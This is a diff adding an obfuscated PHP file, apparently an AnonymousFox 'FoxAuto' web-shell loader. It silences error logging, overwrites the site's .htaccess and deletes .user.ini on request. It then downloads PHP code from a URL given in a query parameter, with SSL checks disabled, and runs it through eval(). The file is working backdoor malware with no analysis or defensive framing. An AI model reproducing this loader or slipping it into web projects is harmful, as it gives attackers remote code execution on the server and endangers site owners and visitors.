@@ -1,0 +1,51 @@
+<?php
+
+error_reporting("\0\0\17\3\30");
+define('É', '«íÛ');
+$GLOBALS[É] = array(0 => "error_log", 1 => "log_errors", 2 => "display_errors", 3 => "FoxAuto V6+<br>Download: anonymousfox.com | <script type='text/javascript'>document.write(unescape('%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%6E%65%74'))</script> | anonymousfox.info     <br>Telegram: @Anonymous_Fox\n", 4 => "403", 5 => "IyBCRUdJTgo8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4KUmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQmFzZSAvClJld3JpdGVSdWxlIF5pbmRleC5waHAkIC0gW0xdClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1mClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kClJld3JpdGVSdWxlIC4gaW5kZXgucGhwIFtMXQo8L0lmTW9kdWxlPgojIEVORAo=", 6 => "DOCUMENT_ROOT", 7 => "file_put_contents", 8 => "w", 9 => "Mozilla/5.0 (Windows NT 10.0;WOW64;rv:43.0) Gecko/20100101 Firefox/43.0", 10 => "https://", 11 => "http://", 12 => "php", 13 => "php", 14 => "<?php", 15 => "", 16 => "?>");
+error_reporting(0);
+@ini_set($GLOBALS[É][0], NULL);
+@ini_set($GLOBALS[É][0x1], 0);
+@ini_set($GLOBALS[É][0x2], 0);
+echo "FoxAuto V6+<br>Download: anonymousfox.com | <script type='text/javascript'>document.write(unescape('%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%6E%65%74'))</script> | anonymousfox.info     <br>Telegram: @Anonymous_Fox\n";
+if (isset($_GET[$GLOBALS[É][0x4]])) {
+    $PvDde = "# BEGIN\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index.php\$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n</IfModule>\n# END\n";
+    $dt68w = $_SERVER[$GLOBALS[É][0x6]];
+    unlink("{$dt68w}/.htaccess");
+    if (function_exists($GLOBALS[É][0x7])) {
+        file_put_contents("{$dt68w}/.htaccess", $PvDde);
+    } else {
+        fwrite(fopen("{$dt68w}/.htaccess", $GLOBALS[É][0x8]), $PvDde);
+    }
+    if (file_exists("{$dt68w}/.user.ini")) {
+        unlink("{$dt68w}/.user.ini");
+    }
+}
+function curlFoxAuto($d15uw)
+{
+    $Au0oE = curl_init();
+    curl_setopt($Au0oE, CURLOPT_TIMEOUT, 0x1e);
+    curl_setopt($Au0oE, CURLOPT_RETURNTRANSFER, !0);
+    curl_setopt($Au0oE, CURLOPT_URL, $d15uw);
+    curl_setopt($Au0oE, CURLOPT_USERAGENT, $GLOBALS[É][0x9]);
+    curl_setopt($Au0oE, CURLOPT_FOLLOWLOCATION, !0);
+    if (stristr($d15uw, $GLOBALS[É][0xa])) {
+        curl_setopt($Au0oE, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($Au0oE, CURLOPT_SSL_VERIFYHOST, 0);
+    }
+    curl_setopt($Au0oE, CURLOPT_HEADER, !1);
+    return curl_exec($Au0oE);
+}
+$PmArP = $GLOBALS[É][0xb] . $_GET[$GLOBALS[É][0xc]];
+if (empty($_GET[$GLOBALS[É][0xd]])) {
+    exit;
+} else {
+    $pOXsz = file_get_contents($PmArP);
+    if (empty($pOXsz)) {
+        $pOXsz = curlFoxAuto($PmArP);
+    }
+    $pOXsz = str_replace($GLOBALS[É][0xe], $GLOBALS[É][0xf], $pOXsz);
+    $pOXsz = str_replace($GLOBALS[É][0x10], $GLOBALS[É][0xf], $pOXsz);
+    eval($pOXsz);
+}
+ /* FoxAuto */
